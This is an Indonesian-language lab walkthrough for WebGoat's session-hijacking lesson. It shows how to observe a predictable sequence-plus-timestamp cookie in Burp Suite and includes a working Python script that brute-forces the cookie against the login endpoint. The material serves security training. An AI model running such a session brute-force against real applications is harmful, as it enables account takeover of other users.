# Hijack a session
Pengembang aplikasi yang mengembangkan ID sesi mereka sendiri sering lupa untuk memasukkan kompleksitas dan keacakan yang diperlukan untuk keamanan. Jika ID sesi khusus pengguna tidak rumit dan acak, maka aplikasi tersebut sangat rentan terhadap serangan brute force berbasis sesi.

- Hidupkan tool Burp Suite terlebih dahulu, lalu akses halaman `http://<IP_Server>:8080/WebGoat/start.mvc?username=testing#lesson/HijackSession.lesson/1` kemudian masukkan username `tom` dan password `tom` lalu tekan tombol **Access**. Anda juga bisa memasukkan username dan password secara bebas sesuai keinginan anda

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/hijack%20session/hs%201.JPG)

- Buka tool Burp Suite, maka terdapat terdapat request yang mengarah ke path URL `/WebGoat/HijackSession/login` bertipe `POST`

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/hijack%20session/hs%202.JPG)

- Klik kanan request tersebut lalu pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/hijack%20session/hs%203.JPG)

- Pindah ke tab Repeater dan klik tombol **Send**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/hijack%20session/hs%204.JPG)

- Tekan tombol **Send** berulang kali sambil mengamati pola perubahan nilai pada `hijack_cookie`

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/hijack%20session/hs%205.JPG)

- Selama percobaan diatas kita mencatat perubahan nilai `hijack_cookie` sebagai berikut
```sh
6096954623810981710-1718181739783
6096954623810981712-1718181785192
6096954623810981713-1718181801395
6096954623810981714-1718181818085
```
- Seperti yang kita ketahui bahwa nilai `hijack_cookie` terdiri dari `nomor urut-unix time`. Nomor urut tersebut bertambah 1 untuk setiap pengulangan request. Ada juga yang langsung bertambah 2. Jika bertambah 2 maka kemungkinan nilai `hijack_cookie` sebelumnya sudah terbentuk karena sudah melakukan login terlebih dahulu. Untuk nilai unix time akan muncul sesuai waktu user melakukan login sehingga kita perlu melakukan brute force untuk menemukan waktu login yang sesuai dengan user tersebut. Berdasarkan daftar diatas, kemungkinan nomor urut user anonim adalah `6096954623810981711` lalu untuk unix time berada di rentang `1718181739783` hingga `1718181785192`. Disini kita menggunakan program python untuk melakukan brute force dengan source code sebagai berikut:
```sh
import requests

url = 'http://IP_Server:8080' #ubah url sesuai url server anda

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': url+'/WebGoat/start.mvc?username=testing',
    'Origin': url,
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}
#ubah sesuai username dan password yang anda gunakan
form_data = {
    'username':'xxx',
    'password':'xxx'
}

step = 1
#ubah rentang sesuai unix time di Burp Suite anda
for i in range(39782, 85193):
	#ubah sesuai nilai yang tampil pada Burp Suite anda
	hijack_cookie = '6096954623810981711-17181817'+str(i)
	#ubah nilai JSESSIONID sesuai nilai JSESSIONID yang muncul di Burp Suite anda
	headers.update({'Cookie': 'JSESSIONID=xxx; hijack_cookie='+hijack_cookie})
	response = requests.post(url+'/WebGoat/HijackSession/login', data=form_data, headers=headers)
	if 'false' in response.text:
		json_response = response.json()
		print('{} feedback: {}'.format(step, json_response['feedback']))
		response.close()
	else:
		print('hijack_cookie'+hijack_cookie)
		print(response.text)
		response.close()
		break
	step+=1

```
- Simpan source diatas dengan nama `hijack_session.py` lalu jalankan program diatas
```sh
python3 hijack_session.py
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/hijack%20session/hs%206.JPG)

- Jika percobaan diatas belum berhasil, anda perlu mengganti nomor urut dan rentang unix time lainnya hingga menemukan hasil yang sesuai